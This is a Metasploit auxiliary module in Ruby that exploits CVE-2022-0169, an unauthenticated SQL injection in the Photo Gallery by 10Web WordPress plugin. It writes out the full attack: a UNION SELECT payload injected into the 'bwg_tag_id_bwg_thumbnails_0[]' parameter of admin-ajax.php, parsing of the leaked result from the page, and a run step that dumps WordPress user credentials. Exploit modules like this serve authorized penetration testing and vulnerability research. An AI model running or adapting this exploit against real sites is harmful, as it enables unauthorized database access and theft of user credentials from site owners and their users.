##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Exploit::Remote::HTTP::Wordpress::SQLi
  prepend Msf::Exploit::Remote::AutoCheck

  GET_SQLI_OBJECT_FAILED_ERROR_MSG = 'Unable to successfully retrieve an SQLi object'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Photo Gallery Plugin SQL Injection (CVE-2022-0169)',
        'Description' => %q{
          The Photo Gallery by 10Web WordPress plugin <= 1.6.0 is vulnerable to
          unauthenticated SQL injection via the 'bwg_tag_id_bwg_thumbnails_0[]'
          parameter in admin-ajax.php (action=bwg_frontend_data).
        },
        'Author' => [
          'Krzysztof Zając',    # Discovery
          'Valentin Lobstein',  # Metasploit module
          'X3RX3S'              # Help
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2022-0169'],
          ['WPVDB', '0b4d870f-eab8-4544-91f8-9c5f0538709c'],
          ['URL', 'https://github.com/X3RX3SSec/CVE-2022-0169']
        ],
        'DefaultOptions' => {
          'VERBOSE' => true,
          'COUNT' => 5
        },
        'DisclosureDate' => '2022-03-14',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path to WordPress', '/']),
      Opt::RPORT(80)
    ])
  end

  def get_sqli_object
    create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true }) do |payload|
      expression = payload.to_s.strip.gsub(/\s+/, ' ')
      columns = Array.new(23) { |i| i == 7 ? "(#{expression})" : rand(1000..9999) }
      injected = ")\" union select #{columns.join(',')} -- -"

      res = send_request_cgi(
        'method' => 'GET',
        'uri' => normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php'),
        'vars_get' => {
          'action' => 'bwg_frontend_data',
          'shortcode_id' => '1',
          'bwg_tag_id_bwg_thumbnails_0[]' => injected
        }
      )
      next GET_SQLI_OBJECT_FAILED_ERROR_MSG unless res&.code == 200

      node = res.get_html_document.at_css('div.bwg-title2')
      result = node&.text.to_s.strip
      next GET_SQLI_OBJECT_FAILED_ERROR_MSG if result.empty?

      result
    end
  end

  def check
    @sqli = get_sqli_object
    return Exploit::CheckCode::Unknown(GET_SQLI_OBJECT_FAILED_ERROR_MSG) if @sqli == GET_SQLI_OBJECT_FAILED_ERROR_MSG

    @sqli.test_vulnerable ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
  end

  def run
    @sqli ||= get_sqli_object
    fail_with(Failure::UnexpectedReply, GET_SQLI_OBJECT_FAILED_ERROR_MSG) if @sqli == GET_SQLI_OBJECT_FAILED_ERROR_MSG

    wordpress_sqli_initialize(@sqli)
    wordpress_sqli_get_users_credentials(datastore['COUNT'])
  end
end
